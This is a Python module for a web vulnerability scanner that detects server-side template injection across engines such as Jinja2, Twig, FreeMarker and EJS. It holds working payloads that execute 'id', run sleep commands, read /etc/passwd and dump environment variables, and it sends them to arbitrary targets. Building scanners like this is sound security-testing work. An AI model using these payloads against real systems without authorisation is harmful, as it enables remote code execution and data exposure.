"""C20 – SSTI polyglot tester.

Detects Server-Side Template Injection across multiple template engines using
polyglot payloads, adaptive fingerprinting, blind SSTI probes, and RCE
escalation techniques with sandbox escape attempts.
"""

from __future__ import annotations

import asyncio
import random
import re
import string
import time
from datetime import datetime
from typing import Any
from urllib.parse import quote, urlencode

import httpx

from app.modules.base_module import BaseModule

# ---------------------------------------------------------------------------
# Polyglot payload
# ---------------------------------------------------------------------------

# One request may trigger multiple engines — look for "49" in response
_POLYGLOT_PAYLOAD = "${{7*7}}{{7*7}}{7*7}#{7*7}<%=7*7%>"
_POLYGLOT_MARKER = "49"

# ---------------------------------------------------------------------------
# Engine-specific fingerprinting payloads
# ---------------------------------------------------------------------------

_ENGINE_PAYLOADS: dict[str, list[str]] = {
    "Jinja2": [
        "{{7*7}}",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
    "Twig": [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{_self.env.registerUndefinedFilterCallback('phpinfo')}}",
    ],
    "FreeMarker": [
        "${7*7}",
        "<#assign x=7*7>${x}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ],
    "Velocity": [
        "#set($x=7*7)${x}",
        "#set($e='')${e.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(e.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
    ],
    "Smarty": [
        "{$smarty.version}",
        "{php}echo 7*7;{/php}",
        "{math equation='7*7'}",
    ],
    "Mako": [
        "${7*7}",
        "<%python>print(7*7)</%python>",
        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
    ],
    "EJS": [
        "<%=7*7%>",
        "<%= 7*7 %>",
        "<% process.mainModule.require('child_process').exec('id', function(err,data){res.end(data)}) %>",
    ],
    "Handlebars": [
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",
        "{{7}}",
    ],
    "Thymeleaf": [
        "[[${7*7}]]",
        "[(${7*7})]",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "Pebble": [
        "{{7*7}}",
        "{{'id' | upper}}",
    ],
    "Tornado": [
        "{{7*7}}",
        "{%import os%}{{os.popen('id').read()}}",
    ],
}

# RCE escalation payloads per engine
_RCE_PAYLOADS: dict[str, list[str]] = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{self.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
    ],
    "Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "FreeMarker": [
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ],
    "Mako": [
        "<%import os%>${os.popen('id').read()}",
    ],
    "EJS": [
        "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>",
    ],
    "Velocity": [
        "#set($rt = $class.forName('java.lang.Runtime'))#set($chr=$class.forName('java.lang.Character'))#set($ex=$rt.exec('id'))$ex.text",
    ],
    "Thymeleaf": [
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
}

# Sandbox escape techniques
_SANDBOX_ESCAPE_PAYLOADS = [
    # Python (Jinja2/Mako)
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{request.__class__.__mro__[8].__subclasses__()[40]('/etc/passwd').read()}}",
    # Java (Thymeleaf/FreeMarker)
    "${T(java.lang.System).getenv()}",
    # Generic bypass attempts
    "{{7*7|e}}",
    "{{7|multiply(7)}}",
]

# Blind SSTI payloads using time delays
_BLIND_SLEEP_PAYLOADS: dict[str, str] = {
    "Jinja2": "{{lipsum.__globals__['os'].popen('sleep 3').read()}}",
    "Mako": "<%import time%>${time.sleep(3)}",
    "EJS": "<% require('child_process').execSync('sleep 3') %>",
    "Velocity": "#set($rt=$class.forName('java.lang.Runtime').getRuntime())$rt.exec(['sleep','3'])",
}

_SLEEP_THRESHOLD = 2.5  # seconds


def _unique_marker() -> str:
    return "ssti_" + "".join(random.choices(string.digits, k=8))


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------


class SSTIPolyglotTester(BaseModule):
    """Multi-engine SSTI tester with polyglot detection, engine fingerprinting,
    blind SSTI, RCE escalation, and sandbox escape techniques."""

    name = "ssti_polyglot"
    description = (
        "Detects SSTI across Jinja2, Twig, FreeMarker, Velocity, Smarty, Mako, "
        "EJS, Handlebars, Thymeleaf — with RCE escalation and blind detection."
    )
    version = "1.0.0"
    category = "injection"

    async def run(self, target: str, **kwargs) -> dict[str, Any]:
        """Run SSTI detection against *target*.

        Args:
            target: Base URL of the application.
            **kwargs:
                paths (list[str]): URL paths to test (default: /).
                params (list[str]): Query parameter names to inject into (default: [q, name, input]).
                post_fields (list[str]): POST field names to inject into (default: [q, name, input]).
                timeout (int): HTTP timeout (default: 10).
                concurrency (int): Max parallel requests (default: 10).
                test_rce (bool): Send RCE escalation payloads (default: False).
                test_blind (bool): Send time-based blind probes (default: False).

        Returns:
            Dict with ``findings``, ``engine_detections``, and metadata.
        """
        self.started_at = datetime.utcnow()
        base = _normalise_url(target)
        paths: list[str] = kwargs.get("paths", ["/"])
        params: list[str] = kwargs.get("params", ["q", "name", "input", "search", "template"])
        post_fields: list[str] = kwargs.get("post_fields", ["q", "name", "input", "message"])
        timeout = int(kwargs.get("timeout", 10))
        concurrency = min(int(kwargs.get("concurrency", 10)), 30)
        test_rce: bool = bool(kwargs.get("test_rce", False))
        test_blind: bool = bool(kwargs.get("test_blind", False))

        engine_detections: list[dict[str, Any]] = []
        sem = asyncio.Semaphore(concurrency)

        async with httpx.AsyncClient(
            timeout=timeout, verify=False, follow_redirects=True,
            limits=httpx.Limits(max_connections=concurrency, max_keepalive_connections=concurrency),
        ) as client:
            tasks: list[Any] = []
            for path in paths:
                url = base.rstrip("/") + path
                # Polyglot detection via GET params
                for param in params:
                    tasks.append(self._test_polyglot_get(client, url, param, sem))
                # Polyglot detection via POST body
                for field in post_fields:
                    tasks.append(self._test_polyglot_post(client, url, field, sem))
                # Engine fingerprinting
                for engine, payloads in _ENGINE_PAYLOADS.items():
                    for param in params:
                        tasks.append(self._fingerprint_engine(client, url, param, engine, payloads, sem))
                # Sandbox escapes
                tasks.append(self._test_sandbox_escape(client, url, params[0], sem))
                # Blind time-based
                if test_blind:
                    tasks.append(self._test_blind_ssti(client, url, params[0], sem))
                # RCE escalation
                if test_rce:
                    tasks.append(self._test_rce_escalation(client, url, params[0], sem))

            batch = await asyncio.gather(*tasks, return_exceptions=True)

        for result in batch:
            if isinstance(result, dict) and result.get("engine_detected"):
                engine_detections.append(result)
            elif isinstance(result, list):
                engine_detections.extend(r for r in result if isinstance(r, dict))

        self.completed_at = datetime.utcnow()
        return {
            "module": self.name,
            "target": base,
            "findings": self.results,
            "engine_detections": engine_detections,
            "started_at": self.started_at.isoformat(),
            "completed_at": self.completed_at.isoformat(),
        }

    # ------------------------------------------------------------------ #
    # Polyglot detection                                                   #
    # ------------------------------------------------------------------ #

    async def _test_polyglot_get(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        sem: asyncio.Semaphore,
    ) -> dict[str, Any]:
        """Inject the polyglot payload via GET parameter."""
        test_url = f"{url}?{param}={quote(_POLYGLOT_PAYLOAD)}"
        resp = await _safe_request(client, "GET", test_url, sem)
        detected, evidence = _check_marker(resp, _POLYGLOT_MARKER)
        if detected:
            self.add_finding(
                title=f"SSTI polyglot detected (GET ?{param}=)",
                severity="critical",
                description=(
                    f"The polyglot SSTI payload returned '49' in the response from "
                    f"'{url}' via GET parameter '{param}'. At least one template engine "
                    "is evaluating user input."
                ),
                evidence=evidence,
                url=test_url,
                param=param,
                method="GET",
            )
        return {
            "type": "polyglot_get",
            "url": test_url,
            "param": param,
            "detected": detected,
            "evidence": evidence,
        }

    async def _test_polyglot_post(
        self,
        client: httpx.AsyncClient,
        url: str,
        field: str,
        sem: asyncio.Semaphore,
    ) -> dict[str, Any]:
        """Inject the polyglot payload via POST body field."""
        data = {field: _POLYGLOT_PAYLOAD}
        resp = await _safe_request(
            client, "POST", url, sem,
            content=urlencode(data).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        detected, evidence = _check_marker(resp, _POLYGLOT_MARKER)
        if detected:
            self.add_finding(
                title=f"SSTI polyglot detected (POST field={field})",
                severity="critical",
                description=(
                    f"The polyglot SSTI payload returned '49' in the response from "
                    f"'{url}' via POST field '{field}'. Template injection confirmed."
                ),
                evidence=evidence,
                url=url,
                field=field,
                method="POST",
            )
        return {
            "type": "polyglot_post",
            "url": url,
            "field": field,
            "detected": detected,
            "evidence": evidence,
        }

    # ------------------------------------------------------------------ #
    # Engine fingerprinting                                                #
    # ------------------------------------------------------------------ #

    async def _fingerprint_engine(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        engine: str,
        payloads: list[str],
        sem: asyncio.Semaphore,
    ) -> dict[str, Any]:
        """Try engine-specific payloads to confirm which template engine is running."""
        for payload in payloads:
            test_url = f"{url}?{param}={quote(payload)}"
            resp = await _safe_request(client, "GET", test_url, sem)
            detected, evidence = _check_marker(resp, _POLYGLOT_MARKER)
            if not detected:
                # Also check for engine-specific output patterns
                detected, evidence = _check_engine_specific(resp, engine)
            if detected:
                self.add_finding(
                    title=f"SSTI engine fingerprinted: {engine}",
                    severity="critical",
                    description=(
                        f"Engine-specific payload for {engine} produced output in "
                        f"the response from '{url}' (param '{param}'). "
                        f"Template engine confirmed as {engine}."
                    ),
                    evidence=f"Payload: {payload[:80]}\n{evidence}",
                    url=test_url,
                    engine=engine,
                    param=param,
                )
                return {
                    "engine_detected": True,
                    "engine": engine,
                    "url": test_url,
                    "payload": payload[:80],
                    "evidence": evidence,
                }
        return {"engine_detected": False, "engine": engine, "url": url}

    # ------------------------------------------------------------------ #
    # Sandbox escape                                                       #
    # ------------------------------------------------------------------ #

    async def _test_sandbox_escape(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        sem: asyncio.Semaphore,
    ) -> list[dict[str, Any]]:
        """Try sandbox escape payloads and look for sensitive data in responses."""
        results: list[dict[str, Any]] = []
        escape_indicators = ["object at 0x", "NoneType", "class 'type'", "subprocess", "os.path"]
        for payload in _SANDBOX_ESCAPE_PAYLOADS:
            test_url = f"{url}?{param}={quote(payload)}"
            resp = await _safe_request(client, "GET", test_url, sem)
            if resp is None:
                continue
            text = _safe_text(resp).lower()
            hits = [ind for ind in escape_indicators if ind.lower() in text]
            result = {
                "type": "sandbox_escape",
                "payload": payload[:80],
                "url": test_url,
                "indicators": hits,
            }
            results.append(result)
            if hits:
                self.add_finding(
                    title="SSTI sandbox escape indicators found",
                    severity="critical",
                    description=(
                        f"Sandbox escape payload returned Python object references "
                        f"({hits}) in the response. This indicates the sandbox is "
                        "leaking internal object access."
                    ),
                    evidence=f"Indicators: {hits}",
                    url=test_url,
                )
        return results

    # ------------------------------------------------------------------ #
    # Blind SSTI (time-based)                                             #
    # ------------------------------------------------------------------ #

    async def _test_blind_ssti(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        sem: asyncio.Semaphore,
    ) -> list[dict[str, Any]]:
        """Send sleep-based payloads to detect blind SSTI via response timing."""
        results: list[dict[str, Any]] = []
        for engine, payload in _BLIND_SLEEP_PAYLOADS.items():
            test_url = f"{url}?{param}={quote(payload)}"
            start = time.monotonic()
            resp = await _safe_request(client, "GET", test_url, sem)
            elapsed = time.monotonic() - start
            result = {
                "type": "blind_ssti",
                "engine": engine,
                "payload": payload[:80],
                "url": test_url,
                "elapsed": round(elapsed, 3),
                "triggered": elapsed >= _SLEEP_THRESHOLD,
            }
            results.append(result)
            if elapsed >= _SLEEP_THRESHOLD:
                self.add_finding(
                    title=f"Blind SSTI detected ({engine}, time-based)",
                    severity="critical",
                    description=(
                        f"A sleep-based blind SSTI payload for {engine} caused a "
                        f"{elapsed:.2f}s response delay (threshold: {_SLEEP_THRESHOLD}s). "
                        "This confirms server-side template injection without output reflection."
                    ),
                    evidence=f"Elapsed: {elapsed:.2f}s, engine: {engine}",
                    url=test_url,
                    engine=engine,
                )
        return results

    # ------------------------------------------------------------------ #
    # RCE escalation                                                       #
    # ------------------------------------------------------------------ #

    async def _test_rce_escalation(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        sem: asyncio.Semaphore,
    ) -> list[dict[str, Any]]:
        """Attempt RCE via confirmed SSTI engines."""
        results: list[dict[str, Any]] = []
        rce_indicators = ["uid=", "gid=", "root", "daemon", "/etc/passwd", "bin/bash"]
        for engine, payloads in _RCE_PAYLOADS.items():
            for payload in payloads:
                test_url = f"{url}?{param}={quote(payload)}"
                resp = await _safe_request(client, "GET", test_url, sem)
                if resp is None:
                    continue
                text = _safe_text(resp)
                hits = [ind for ind in rce_indicators if ind in text]
                result = {
                    "type": "rce_escalation",
                    "engine": engine,
                    "payload": payload[:80],
                    "url": test_url,
                    "rce_indicators": hits,
                }
                results.append(result)
                if hits:
                    self.add_finding(
                        title=f"SSTI → RCE confirmed ({engine})",
                        severity="critical",
                        description=(
                            f"An SSTI RCE payload for {engine} produced command output "
                            f"indicators ({hits}) in the response from '{url}'. "
                            "Remote code execution is confirmed."
                        ),
                        evidence=f"Indicators: {hits}\nSnippet: {text[:300]}",
                        url=test_url,
                        engine=engine,
                    )
        return results


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------


def _normalise_url(target: str) -> str:
    if not target.startswith(("http://", "https://")):
        return f"https://{target}"
    return target


def _safe_text(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    try:
        return resp.text
    except Exception:
        return ""


async def _safe_request(
    client: httpx.AsyncClient,
    method: str,
    url: str,
    sem: asyncio.Semaphore,
    **kwargs: Any,
) -> httpx.Response | None:
    try:
        async with sem:
            return await client.request(method, url, **kwargs)
    except Exception:
        return None


def _check_marker(resp: httpx.Response | None, marker: str) -> tuple[bool, str]:
    """Check if *marker* appears in the response text."""
    text = _safe_text(resp)
    if marker in text:
        idx = text.index(marker)
        snippet = text[max(0, idx - 50): idx + len(marker) + 100]
        return True, snippet
    return False, ""


def _check_engine_specific(resp: httpx.Response | None, engine: str) -> tuple[bool, str]:
    """Check for engine-specific output patterns in the response."""
    text = _safe_text(resp)
    patterns: dict[str, list[str]] = {
        "Jinja2": ["<Config", "Environment", "Undefined", "jinja"],
        "Twig": ["Twig_", "twig.extension", "Twig\\"],
        "FreeMarker": ["freemarker.", "Template processing error"],
        "Velocity": ["VelocityContext", "org.apache.velocity"],
        "Smarty": ["Smarty", "smarty_"],
        "EJS": ["EJS", "ejs/lib"],
        "Thymeleaf": ["org.thymeleaf", "thymeleaf"],
        "Handlebars": ["handlebars", "Handlebars"],
        "Mako": ["mako.", "RenderModuleCache"],
    }
    for indicator in patterns.get(engine, []):
        if indicator.lower() in text.lower():
            idx = text.lower().index(indicator.lower())
            return True, text[max(0, idx - 20): idx + 100]
    return False, ""
